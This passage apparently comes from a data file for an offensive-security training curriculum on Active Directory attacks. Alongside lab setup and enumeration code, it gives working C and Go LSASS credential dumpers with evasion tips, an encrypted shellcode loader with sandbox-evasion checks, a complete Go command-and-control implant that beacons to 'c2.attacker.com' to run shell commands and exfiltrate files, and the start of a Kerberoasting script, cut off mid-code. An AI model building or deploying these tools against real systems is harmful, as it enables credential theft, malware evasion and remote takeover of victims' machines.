│       - Group memberships                │
│       - Privileges                       │
├─────────────────────────────────────────┤
│  ENCRYPTED WITH: krbtgt account hash     │
└─────────────────────────────────────────┘
\`\`\`

#### TGS (Service Ticket)
\`\`\`
┌─────────────────────────────────────────┐
│              TGS Contents                │
├─────────────────────────────────────────┤
│  Username: alice@CORP.LOCAL             │
│  Service: MSSQLSvc/sql01.corp.local     │
│  Validity: Start/End times               │
│  Session Key: [Random key]               │
│  PAC: [Copied from TGT]                  │
├─────────────────────────────────────────┤
│  ENCRYPTED WITH: Service account hash    │
│  (svc_sql in this case)                  │
└─────────────────────────────────────────┘
\`\`\`

### Attack Opportunities

| Attack | Exploits |
|--------|----------|
| **Kerberoasting** | Service tickets encrypted with service account password |
| **AS-REP Roasting** | Users without pre-auth leak hashes |
| **Golden Ticket** | Knowing krbtgt hash = forge any TGT |
| **Silver Ticket** | Knowing service hash = forge service tickets |
| **Pass-the-Ticket** | Stolen tickets can be reused |
| **Overpass-the-Hash** | NTLM hash → Request TGT |

### Python Kerberos Example (impacket)
\`\`\`python
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal

# Get TGT with password
username = 'alice'
password = 'Password123!'
domain = 'corp.local'

client = Principal(username, type=1)
tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
    client, password, domain,
    lmhash='', nthash='',
    aesKey='', kdcHost='dc01.corp.local'
)

print(f"[+] Got TGT for {username}@{domain}")
\`\`\``
				},
				{
					title: 'Build a Vulnerable AD Lab',
					description: 'Set up a home lab with common misconfigurations',
					details: `## Vulnerable AD Lab Setup

### Network Design
\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    LAB NETWORK (10.0.0.0/24)                 │
│                                                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐          │
│  │    DC01     │  │    WS01     │  │    WS02     │          │
│  │ Win Srv 2022│  │  Windows 11 │  │  Windows 10 │          │
│  │  10.0.0.10  │  │  10.0.0.20  │  │  10.0.0.21  │          │
│  │             │  │             │  │             │          │
│  │ - AD DS     │  │ - Domain    │  │ - Domain    │          │
│  │ - DNS       │  │   joined    │  │   joined    │          │
│  │ - ADCS      │  │ - Local     │  │ - Admin:    │          │
│  │             │  │   admin     │  │   itadmin   │          │
│  └─────────────┘  └─────────────┘  └─────────────┘          │
│                                                              │
│  ┌─────────────┐                                             │
│  │   YOURBOX   │   Attacker machine                          │
│  │    Kali     │   10.0.0.100                                │
│  └─────────────┘                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

### DC01 Setup Script
\`\`\`powershell
# Install AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest -DomainName "corp.local" -DomainNetbiosName "CORP" -InstallDns

# After reboot, create OUs
New-ADOrganizationalUnit -Name "IT" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "Users" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "Service Accounts" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "Servers" -Path "DC=corp,DC=local"
\`\`\`

### Create Vulnerable Configurations

\`\`\`powershell
# ========== USERS ==========

# Regular users
New-ADUser -Name "alice" -SamAccountName "alice" -UserPrincipalName "alice@corp.local" -Path "OU=Users,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true

New-ADUser -Name "bob" -SamAccountName "bob" -UserPrincipalName "bob@corp.local" -Path "OU=Users,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true

# IT Admin (high value target)
New-ADUser -Name "itadmin" -SamAccountName "itadmin" -UserPrincipalName "itadmin@corp.local" -Path "OU=IT,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "ITAdmin2024!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "itadmin"

# ========== KERBEROASTABLE SERVICE ACCOUNT ==========

New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" -UserPrincipalName "svc_sql@corp.local" -Path "OU=Service Accounts,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "SQLService123!" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true

# Add SPN (makes it Kerberoastable)
setspn -A MSSQLSvc/sql01.corp.local:1433 svc_sql
setspn -A MSSQLSvc/sql01.corp.local svc_sql

# ========== AS-REP ROASTABLE USER ==========

New-ADUser -Name "asrep_user" -SamAccountName "asrep_user" -UserPrincipalName "asrep_user@corp.local" -Path "OU=Users,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "ASREPRoast2024!" -AsPlainText -Force) -Enabled $true

# Disable Kerberos pre-authentication
Set-ADAccountControl -Identity "asrep_user" -DoesNotRequirePreAuth $true

# ========== UNCONSTRAINED DELEGATION ==========

# Enable on a workstation (very dangerous)
Set-ADComputer -Identity "WS01" -TrustedForDelegation $true

# ========== CONSTRAINED DELEGATION ==========

Set-ADUser -Identity "svc_sql" -TrustedForDelegation $false
Set-ADUser -Identity "svc_sql" -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.corp.local','cifs/dc01')}

# ========== WEAK ACLs ==========

# Give user GenericAll on another user (can reset password)
$acl = Get-ACL "AD:CN=bob,OU=Users,DC=corp,DC=local"
$user = New-Object System.Security.Principal.NTAccount("CORP\\alice")
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user, "GenericAll", "Allow")
$acl.AddAccessRule($ace)
Set-ACL -Path "AD:CN=bob,OU=Users,DC=corp,DC=local" -AclObject $acl

# ========== ADCS VULNERABLE TEMPLATE (ESC1) ==========

# Install ADCS first, then create vulnerable template
# This requires more complex setup - see ADCS lab guides
\`\`\`

### Verify Misconfigurations
\`\`\`powershell
# Check Kerberoastable accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Check AS-REP roastable
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# Check unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Check constrained delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
\`\`\`

### Snapshot Strategy
| Snapshot | Description |
|----------|-------------|
| DC01-Fresh | Clean install |
| DC01-Vulnerable | Misconfigs in place |
| WS01-Joined | Domain joined, pre-attack |
| Lab-Complete | Ready for exercises |`
				},
				{
					title: 'Write a Custom LDAP Enumerator',
					description: 'Build your own AD enumeration tool in Go or Python',
					details: `## LDAP Enumerator

### Python Implementation

\`\`\`python
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
import argparse

class ADEnumerator:
    def __init__(self, dc, domain, username, password):
        self.dc = dc
        self.domain = domain
        self.base_dn = ','.join([f'DC={x}' for x in domain.split('.')])

        # Connect
        server = Server(dc, get_info=ALL)
        self.conn = Connection(
            server,
            user=f'{domain}\\\\{username}',
            password=password,
            authentication=NTLM,
            auto_bind=True
        )
        print(f"[+] Connected to {dc}")

    def get_users(self):
        """Get all domain users."""
        self.conn.search(
            self.base_dn,
            '(&(objectCategory=person)(objectClass=user))',
            attributes=['sAMAccountName', 'memberOf', 'userAccountControl',
                       'servicePrincipalName', 'adminCount', 'description']
        )

        users = []
        for entry in self.conn.entries:
            user = {
                'username': str(entry.sAMAccountName),
                'groups': [str(g) for g in entry.memberOf] if entry.memberOf else [],
                'uac': int(entry.userAccountControl.value) if entry.userAccountControl else 0,
                'spn': [str(s) for s in entry.servicePrincipalName] if entry.servicePrincipalName else [],
                'admin_count': entry.adminCount.value if entry.adminCount else 0,
                'description': str(entry.description) if entry.description else ''
            }
            users.append(user)

        return users

    def get_kerberoastable(self):
        """Find users with SPNs (Kerberoastable)."""
        self.conn.search(
            self.base_dn,
            '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))',
            attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf']
        )

        users = []
        for entry in self.conn.entries:
            users.append({
                'username': str(entry.sAMAccountName),
                'spn': [str(s) for s in entry.servicePrincipalName],
                'privileged': any('Admin' in str(g) for g in entry.memberOf) if entry.memberOf else False
            })

        return users

    def get_asrep_roastable(self):
        """Find users without Kerberos pre-auth."""
        # UAC flag: DONT_REQ_PREAUTH = 0x400000 = 4194304
        self.conn.search(
            self.base_dn,
            '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            attributes=['sAMAccountName']
        )

        return [str(entry.sAMAccountName) for entry in self.conn.entries]

    def get_domain_admins(self):
        """Get Domain Admins group members."""
        self.conn.search(
            self.base_dn,
            '(&(objectCategory=group)(cn=Domain Admins))',
            attributes=['member']
        )

        if self.conn.entries:
            return [str(m) for m in self.conn.entries[0].member]
        return []

    def get_computers(self):
        """Get all domain computers."""
        self.conn.search(
            self.base_dn,
            '(objectCategory=computer)',
            attributes=['name', 'operatingSystem', 'dNSHostName',
                       'userAccountControl', 'msDS-AllowedToDelegateTo']
        )

        computers = []
        for entry in self.conn.entries:
            uac = int(entry.userAccountControl.value) if entry.userAccountControl else 0
            computers.append({
                'name': str(entry.name),
                'os': str(entry.operatingSystem) if entry.operatingSystem else '',
                'dns': str(entry.dNSHostName) if entry.dNSHostName else '',
                'unconstrained': bool(uac & 0x80000),  # TRUSTED_FOR_DELEGATION
                'constrained_to': [str(d) for d in entry['msDS-AllowedToDelegateTo']] if entry['msDS-AllowedToDelegateTo'] else []
            })

        return computers

    def find_delegation(self):
        """Find delegation misconfigurations."""
        results = {
            'unconstrained': [],
            'constrained': [],
            'rbcd': []
        }

        # Unconstrained delegation
        self.conn.search(
            self.base_dn,
            '(userAccountControl:1.2.840.113556.1.4.803:=524288)',
            attributes=['sAMAccountName', 'objectClass']
        )
        results['unconstrained'] = [str(e.sAMAccountName) for e in self.conn.entries]

        # Constrained delegation
        self.conn.search(
            self.base_dn,
            '(msDS-AllowedToDelegateTo=*)',
            attributes=['sAMAccountName', 'msDS-AllowedToDelegateTo']
        )
        for entry in self.conn.entries:
            results['constrained'].append({
                'account': str(entry.sAMAccountName),
                'targets': [str(t) for t in entry['msDS-AllowedToDelegateTo']]
            })

        return results

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--dc', required=True, help='Domain controller IP')
    parser.add_argument('-D', '--domain', required=True, help='Domain name')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    args = parser.parse_args()

    enum = ADEnumerator(args.dc, args.domain, args.username, args.password)

    print("\\n[*] Kerberoastable Users:")
    for user in enum.get_kerberoastable():
        priv = " [PRIVILEGED]" if user['privileged'] else ""
        print(f"    {user['username']}: {user['spn'][0]}{priv}")

    print("\\n[*] AS-REP Roastable Users:")
    for user in enum.get_asrep_roastable():
        print(f"    {user}")

    print("\\n[*] Domain Admins:")
    for admin in enum.get_domain_admins():
        print(f"    {admin}")

    print("\\n[*] Delegation:")
    delegation = enum.find_delegation()
    print(f"    Unconstrained: {delegation['unconstrained']}")
    for c in delegation['constrained']:
        print(f"    Constrained: {c['account']} -> {c['targets']}")

if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
python ad_enum.py -d 10.0.0.10 -D corp.local -u alice -p 'Password123!'
\`\`\``
				}
			]
		},
		{
			name: 'Offensive Tooling Development',
			description: 'Build your own tools - running other people\'s scripts teaches you nothing',
			tasks: [
				{
					title: 'Build a Custom Credential Dumper',
					description: 'Dump LSASS without triggering alerts using various techniques',
					details: `## Custom Credential Dumper

### Progression Path
1. Basic MiniDumpWriteDump
2. Direct memory reading
3. Syscall-based access

### Method 1: MiniDumpWriteDump

\`\`\`c
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")

DWORD FindLsassPid() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };

    if (Process32First(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {
    // Enable SeDebugPrivilege
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hToken);

    // Find LSASS
    DWORD pid = FindLsassPid();
    printf("[+] LSASS PID: %d\\n", pid);

    // Open LSASS
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %d\\n", GetLastError());
        return 1;
    }

    // Create dump file
    HANDLE hFile = CreateFile(L"lsass.dmp",
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    // Dump
    BOOL success = MiniDumpWriteDump(
        hProcess,
        pid,
        hFile,
        MiniDumpWithFullMemory,
        NULL, NULL, NULL
    );

    CloseHandle(hFile);
    CloseHandle(hProcess);

    if (success) {
        printf("[+] Dump created: lsass.dmp\\n");
        printf("[*] Parse with: pypykatz lsa minidump lsass.dmp\\n");
    }

    return 0;
}
\`\`\`

### Method 2: Direct Memory Reading

\`\`\`c
// Read LSASS memory directly and parse credentials
// Avoids MiniDumpWriteDump API (heavily monitored)

#include <windows.h>
#include <stdio.h>

// Simplified - real implementation needs to:
// 1. Find lsasrv.dll base address in LSASS
// 2. Locate credential structures
// 3. Parse and decrypt

BOOL ReadLsassMemory(HANDLE hProcess, LPVOID address, SIZE_T size, LPVOID buffer) {
    SIZE_T bytesRead;
    return ReadProcessMemory(hProcess, address, buffer, size, &bytesRead);
}

// You would need to implement:
// - Module enumeration in remote process
// - Pattern scanning for credential structures
// - Decryption of credentials (AES/3DES depending on Windows version)
\`\`\`

### Method 3: Syscalls (Bypass Hooks)

\`\`\`c
// Use direct syscalls to avoid ntdll hooks
// NtReadVirtualMemory instead of ReadProcessMemory
// NtOpenProcess instead of OpenProcess

// See syscall implementation in EDR Evasion module
\`\`\`

### Go Implementation (Simpler)

\`\`\`go
package main

import (
    "fmt"
    "os"
    "syscall"
    "unsafe"
)

var (
    kernel32 = syscall.NewLazyDLL("kernel32.dll")
    dbghelp  = syscall.NewLazyDLL("dbghelp.dll")

    procOpenProcess       = kernel32.NewProc("OpenProcess")
    procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
)

func main() {
    // Find LSASS PID (implement similar to C version)
    pid := uint32(findLsassPid())

    hProcess, _, _ := procOpenProcess.Call(
        0x1F0FFF, // PROCESS_ALL_ACCESS
        0,
        uintptr(pid),
    )

    file, _ := os.Create("lsass.dmp")
    defer file.Close()

    ret, _, _ := procMiniDumpWriteDump.Call(
        hProcess,
        uintptr(pid),
        file.Fd(),
        2, // MiniDumpWithFullMemory
        0, 0, 0,
    )

    if ret != 0 {
        fmt.Println("[+] Dump created")
    }
}
\`\`\`

### Why This Gets Detected
- Opening LSASS with PROCESS_ALL_ACCESS
- MiniDumpWriteDump is heavily monitored
- Writing .dmp file to disk

### Evasion Ideas
- Use syscalls to avoid API hooks
- Duplicate handle instead of OpenProcess
- In-memory only (no disk write)
- Unhook ntdll before operations`
				},
				{
					title: 'Build a Shellcode Loader with Evasion',
					description: 'Implement XOR/AES encryption, syscalls, and sandbox evasion',
					details: `## Evasive Shellcode Loader

### Features to Implement
1. Encrypted payload (XOR or AES)
2. Runtime key derivation
3. Direct syscalls
4. Sandbox evasion checks
5. Delayed execution

### XOR Encrypted Loader

\`\`\`c
#include <windows.h>
#include <stdio.h>

// XOR encrypted shellcode
unsigned char encrypted[] = { /* ... */ };
unsigned char key[] = { 0xDE, 0xAD, 0xBE, 0xEF };

void xor_decrypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    // Sandbox evasion: check for minimum resources
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return 0; // Likely a sandbox
    }

    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        return 0; // Less than 2GB RAM
    }

    // Delayed execution
    Sleep(10000); // 10 seconds

    // Decrypt
    xor_decrypt(encrypted, sizeof(encrypted), key, sizeof(key));

    // Allocate and execute
    LPVOID addr = VirtualAlloc(NULL, sizeof(encrypted),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(addr, encrypted, sizeof(encrypted));

    DWORD old;
    VirtualProtect(addr, sizeof(encrypted), PAGE_EXECUTE_READ, &old);

    ((void(*)())addr)();

    return 0;
}
\`\`\`

### AES Encrypted Loader

\`\`\`c
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

unsigned char encrypted[] = { /* AES encrypted shellcode */ };
unsigned char iv[] = { /* 16 bytes IV */ };

// Key derived at runtime (not hardcoded)
void derive_key(unsigned char* key) {
    // Example: derive from environment or computation
    char* env = getenv("COMPUTERNAME");
    // Hash or derive key from environment
    // This is simplified - use proper KDF in production
}

BOOL aes_decrypt(unsigned char* data, DWORD len, unsigned char* key, unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);

    DWORD decrypted_len;
    BCryptDecrypt(hKey, data, len, NULL, iv, 16,
        data, len, &decrypted_len, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return TRUE;
}
\`\`\`

### Sandbox Evasion Techniques

\`\`\`c
BOOL is_sandbox() {
    // 1. Check processor count
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;

    // 2. Check RAM
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;

    // 3. Check disk size
    ULARGE_INTEGER disk;
    GetDiskFreeSpaceExA("C:\\\\", NULL, &disk, NULL);
    if (disk.QuadPart < 60ULL * 1024 * 1024 * 1024) return TRUE;

    // 4. Check for sandbox processes
    const char* sandbox_processes[] = {
        "vmsrvc.exe", "vboxservice.exe", "vmtoolsd.exe",
        "wireshark.exe", "procmon.exe", "x64dbg.exe"
    };
    // Check if any are running...

    // 5. Check uptime (sandboxes often have low uptime)
    if (GetTickCount64() < 10 * 60 * 1000) return TRUE; // < 10 min

    // 6. Check for debugger
    if (IsDebuggerPresent()) return TRUE;

    return FALSE;
}
\`\`\`

### Direct Syscalls (See EDR Evasion module)
\`\`\`c
// Replace VirtualAlloc with NtAllocateVirtualMemory syscall
// Replace VirtualProtect with NtProtectVirtualMemory syscall
\`\`\``
				},
				{
					title: 'Build a Basic C2 Client',
					description: 'HTTP/HTTPS beaconing with command execution and encryption',
					details: `## Basic C2 Implant

### Features
- HTTP/HTTPS check-in
- Jitter and sleep
- Command execution
- File upload/download
- AES-GCM encryption

### Go Implementation

\`\`\`go
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"
)

const (
    C2_SERVER = "https://c2.attacker.com"
    AES_KEY   = "0123456789abcdef0123456789abcdef"
    SLEEP     = 30 * time.Second
    JITTER    = 0.2
)

var agentID string

type CheckinData struct {
    ID       string \`json:"id"\`
    Hostname string \`json:"hostname"\`
    Username string \`json:"username"\`
    OS       string \`json:"os"\`
    Arch     string \`json:"arch"\`
}

type Task struct {
    ID      string   \`json:"id"\`
    Command string   \`json:"command"\`
    Args    []string \`json:"args"\`
}

type TaskResult struct {
    TaskID string \`json:"task_id"\`
    Output string \`json:"output"\`
    Error  string \`json:"error"\`
}

func encrypt(plaintext []byte) (string, error) {
    block, _ := aes.NewCipher([]byte(AES_KEY))
    gcm, _ := cipher.NewGCM(block)

    nonce := make([]byte, gcm.NonceSize())
    rand.Read(nonce)

    ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
    return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decrypt(encoded string) ([]byte, error) {
    ciphertext, _ := base64.StdEncoding.DecodeString(encoded)

    block, _ := aes.NewCipher([]byte(AES_KEY))
    gcm, _ := cipher.NewGCM(block)

    nonceSize := gcm.NonceSize()
    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

    return gcm.Open(nil, nonce, ciphertext, nil)
}

func checkin() ([]Task, error) {
    hostname, _ := os.Hostname()

    data := CheckinData{
        ID:       agentID,
        Hostname: hostname,
        Username: os.Getenv("USERNAME"),
        OS:       runtime.GOOS,
        Arch:     runtime.GOARCH,
    }

    jsonData, _ := json.Marshal(data)
    encrypted, _ := encrypt(jsonData)

    resp, err := http.Post(C2_SERVER+"/checkin",
        "application/octet-stream",
        bytes.NewReader([]byte(encrypted)))
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    body, _ := io.ReadAll(resp.Body)
    decrypted, _ := decrypt(string(body))

    var response struct {
        AgentID string \`json:"agent_id"\`
        Tasks   []Task \`json:"tasks"\`
    }
    json.Unmarshal(decrypted, &response)

    if agentID == "" {
        agentID = response.AgentID
    }

    return response.Tasks, nil
}

func executeTask(task Task) TaskResult {
    result := TaskResult{TaskID: task.ID}

    switch task.Command {
    case "shell":
        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {
            cmd = exec.Command("cmd", append([]string{"/c"}, task.Args...)...)
        } else {
            cmd = exec.Command("/bin/sh", append([]string{"-c"}, task.Args...)...)
        }
        output, err := cmd.CombinedOutput()
        result.Output = string(output)
        if err != nil {
            result.Error = err.Error()
        }

    case "download":
        content, err := os.ReadFile(task.Args[0])
        if err != nil {
            result.Error = err.Error()
        } else {
            result.Output = base64.StdEncoding.EncodeToString(content)
        }

    case "upload":
        decoded, _ := base64.StdEncoding.DecodeString(task.Args[1])
        err := os.WriteFile(task.Args[0], decoded, 0644)
        if err != nil {
            result.Error = err.Error()
        } else {
            result.Output = "File written"
        }

    case "exit":
        os.Exit(0)
    }

    return result
}

func sendResult(result TaskResult) {
    jsonData, _ := json.Marshal(result)
    encrypted, _ := encrypt(jsonData)

    http.Post(C2_SERVER+"/result",
        "application/octet-stream",
        bytes.NewReader([]byte(encrypted)))
}

func calculateSleep() time.Duration {
    jitterRange := float64(SLEEP) * JITTER
    jitterValue := (float64(time.Now().UnixNano()%1000)/1000*2 - 1) * jitterRange
    return SLEEP + time.Duration(jitterValue)
}

func main() {
    // Initial delay
    time.Sleep(5 * time.Second)

    for {
        tasks, err := checkin()
        if err == nil {
            for _, task := range tasks {
                result := executeTask(task)
                sendResult(result)
            }
        }

        time.Sleep(calculateSleep())
    }
}
\`\`\`

### Build Commands
\`\`\`bash
# Windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o implant.exe

# Linux
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o implant

# With garble (obfuscation)
garble -literals -tiny build -o implant.exe
\`\`\``
				},
				{
					title: 'Build a Reconnaissance Toolkit',
					description: 'Port scanner, subdomain enumerator, and web crawler',
					details: `## Reconnaissance Toolkit

### Port Scanner with Fingerprinting

\`\`\`go
package main

import (
    "bufio"
    "fmt"
    "net"
    "strings"
    "sync"
    "time"
)

type ScanResult struct {
    Port    int
    Open    bool
    Service string
    Banner  string
}

func scanPort(host string, port int, timeout time.Duration) ScanResult {
    result := ScanResult{Port: port}

    conn, err := net.DialTimeout("tcp",
        fmt.Sprintf("%s:%d", host, port), timeout)
    if err != nil {
        return result
    }
    defer conn.Close()

    result.Open = true

    // Banner grab
    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
    reader := bufio.NewReader(conn)
    banner, _ := reader.ReadString('\\n')
    result.Banner = strings.TrimSpace(banner)

    // Service identification
    result.Service = identifyService(port, result.Banner)

    return result
}

func identifyService(port int, banner string) string {
    // Check banner first
    if strings.HasPrefix(banner, "SSH-") {
        return "SSH"
    }
    if strings.Contains(banner, "FTP") {
        return "FTP"
    }
    if strings.Contains(banner, "SMTP") {
        return "SMTP"
    }

    // Fall back to port
    services := map[int]string{
        21: "FTP", 22: "SSH", 23: "Telnet",
        25: "SMTP", 53: "DNS", 80: "HTTP",
        443: "HTTPS", 445: "SMB", 3389: "RDP",
    }
    if s, ok := services[port]; ok {
        return s
    }
    return "Unknown"
}

func scanRange(host string, startPort, endPort, workers int) []ScanResult {
    var results []ScanResult
    var mu sync.Mutex
    var wg sync.WaitGroup

    ports := make(chan int, workers)

    for i := 0; i < workers; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for port := range ports {
                result := scanPort(host, port, 2*time.Second)
                if result.Open {
                    mu.Lock()
                    results = append(results, result)
                    mu.Unlock()
                    fmt.Printf("[+] %d/%s open - %s\\n",
                        result.Port, result.Service, result.Banner)
                }
            }
        }()
    }

    for port := startPort; port <= endPort; port++ {
        ports <- port
    }
    close(ports)
    wg.Wait()

    return results
}
\`\`\`

### Subdomain Enumerator

\`\`\`go
package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
    "sync"
)

func checkSubdomain(subdomain, domain string, wg *sync.WaitGroup, results chan<- string) {
    defer wg.Done()

    fqdn := fmt.Sprintf("%s.%s", subdomain, domain)
    ips, err := net.LookupHost(fqdn)
    if err == nil && len(ips) > 0 {
        results <- fmt.Sprintf("%s -> %v", fqdn, ips)
    }
}

func enumerate(domain, wordlist string, workers int) []string {
    file, _ := os.Open(wordlist)
    defer file.Close()

    var wg sync.WaitGroup
    results := make(chan string, 1000)
    sem := make(chan struct{}, workers)

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        word := scanner.Text()
        wg.Add(1)
        sem <- struct{}{}
        go func(w string) {
            checkSubdomain(w, domain, &wg, results)
            <-sem
        }(word)
    }

    go func() {
        wg.Wait()
        close(results)
    }()

    var found []string
    for r := range results {
        found = append(found, r)
        fmt.Println("[+]", r)
    }

    return found
}
\`\`\`

### Web Crawler

\`\`\`python
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

class WebCrawler:
    def __init__(self, base_url, max_depth=3):
        self.base_url = base_url
        self.domain = urlparse(base_url).netloc
        self.max_depth = max_depth
        self.visited = set()
        self.endpoints = set()
        self.forms = []
        self.emails = set()

    def crawl(self, url=None, depth=0):
        if depth > self.max_depth:
            return

        url = url or self.base_url
        if url in self.visited:
            return

        self.visited.add(url)

        try:
            resp = requests.get(url, timeout=5)
            soup = BeautifulSoup(resp.text, 'html.parser')

            # Extract links
            for link in soup.find_all('a', href=True):
                href = urljoin(url, link['href'])
                if self.domain in href and href not in self.visited:
                    self.endpoints.add(href)
                    self.crawl(href, depth + 1)

            # Extract forms
            for form in soup.find_all('form'):
                self.forms.append({
                    'action': urljoin(url, form.get('action', '')),
                    'method': form.get('method', 'GET'),
                    'inputs': [i.get('name') for i in form.find_all('input')]
                })

            # Extract emails
            emails = re.findall(r'[\\w.-]+@[\\w.-]+', resp.text)
            self.emails.update(emails)

            # Extract JS files
            for script in soup.find_all('script', src=True):
                self.endpoints.add(urljoin(url, script['src']))

        except Exception as e:
            pass

    def report(self):
        print(f"\\n=== Crawl Results for {self.base_url} ===")
        print(f"\\nEndpoints ({len(self.endpoints)}):")
        for e in sorted(self.endpoints)[:20]:
            print(f"  {e}")
        print(f"\\nForms ({len(self.forms)}):")
        for f in self.forms[:10]:
            print(f"  {f['method']} {f['action']}")
        print(f"\\nEmails ({len(self.emails)}):")
        for e in self.emails:
            print(f"  {e}")
\`\`\``
				}
			]
		},
		{
			name: 'AD Attack Paths',
			description: 'Execute classic attack chains manually',
			tasks: [
				{
					title: 'Master Kerberoasting',
					description: 'Write your own Kerberoasting script from scratch',
					details: `## Kerberoasting Attack

### Attack Flow
\`\`\`
1. Find users with SPNs
2. Request TGS tickets for their services
3. Extract ticket encrypted with service account password
4. Crack offline with hashcat
\`\`\`

### Python Implementation

\`\`\`python
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from impacket.ldap import ldap
import argparse

class Kerberoaster:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password

    def get_tgt(self):
        """Get initial TGT."""
        principal = Principal(self.username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            principal, self.password, self.domain,
            lmhash='', nthash='', kdcHost=self.dc_ip)

        return tgt, cipher, sessionKey

    def find_spn_users(self):
        """Find all users with SPNs via LDAP."""
        ldap_url = f'ldap://{self.dc_ip}'
        base_dn = ','.join([f'DC={x}' for x in self.domain.split('.')])

        conn = ldap.LDAPConnection(ldap_url, base_dn)
        conn.login(self.username, self.password, self.domain)

        results = conn.search(
